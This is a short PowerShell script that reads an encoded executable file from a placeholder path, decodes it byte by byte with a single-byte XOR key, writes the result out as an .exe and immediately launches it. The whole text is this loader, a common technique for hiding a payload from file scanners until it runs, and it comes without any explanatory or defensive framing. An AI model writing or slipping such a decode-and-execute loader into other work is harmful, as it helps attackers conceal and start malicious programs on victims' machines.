$PEBytes = Get-Content -Path "Path\To\Encoded\PE.bin" -Encoding Byte

$Key = 0xAA

$DecodedBytes = for ($i = 0; $i -lt $PEBytes.Length; $i++)
{
    $PEBytes[$i] -bxor $Key
}

$DecodedPE = [System.IO.File]::Create("Path\To\Decoded\PE.exe")
$DecodedPE.Write($DecodedBytes, 0, $DecodedBytes.Length)
$DecodedPE.Close()

Start-Process -FilePath "Path\To\Decoded\PE.exe"
